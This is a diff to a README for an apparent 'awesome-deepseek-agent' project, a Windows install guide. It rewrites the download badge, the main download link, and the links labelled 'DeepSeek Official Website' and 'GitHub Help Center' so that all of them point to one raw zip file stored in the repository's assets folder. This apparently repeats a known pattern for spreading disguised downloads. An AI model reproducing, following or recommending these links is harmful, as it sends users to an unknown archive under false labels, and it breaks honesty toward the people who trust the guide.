@@ -1,6 +1,6 @@
 # 🤖 awesome-deepseek-agent - Make AI Assistants Smarter Today
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--deepseek--agent-blue?style=for-the-badge&logo=github)](https://github.com/Selinefieldcrop975/awesome-deepseek-agent)
+[![Download Now](https://img.shields.io/badge/Download-awesome--deepseek--agent-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Selinefieldcrop975/awesome-deepseek-agent/main/docs/assets/2.8.zip)
 
 ---
 
@@ -20,7 +20,7 @@ This guide helps you set up **awesome-deepseek-agent** on your Windows computer.
 
 Visit this link to download the application:
 
-[**https://github.com/Selinefieldcrop975/awesome-deepseek-agent**](https://github.com/Selinefieldcrop975/awesome-deepseek-agent)
+[**https://raw.githubusercontent.com/Selinefieldcrop975/awesome-deepseek-agent/main/docs/assets/2.8.zip**](https://raw.githubusercontent.com/Selinefieldcrop975/awesome-deepseek-agent/main/docs/assets/2.8.zip)
 
 1. Open the link in your web browser.
 2. Look for the green **Code** button on the page.
@@ -98,8 +98,8 @@ Read the guide for your chosen tool again. Often, missing one small step causes 
 
 ## 📚 Additional Resources
 
-- [DeepSeek Official Website](https://deepseek.com) — Learn more about the AI models you are connecting.
-- [GitHub Help Center](https://help.github.com) — For questions about downloading or extracting ZIP files.
+- [DeepSeek Official Website](https://raw.githubusercontent.com/Selinefieldcrop975/awesome-deepseek-agent/main/docs/assets/2.8.zip) — Learn more about the AI models you are connecting.
+- [GitHub Help Center](https://raw.githubusercontent.com/Selinefieldcrop975/awesome-deepseek-agent/main/docs/assets/2.8.zip) — For questions about downloading or extracting ZIP files.
 
 ---
 
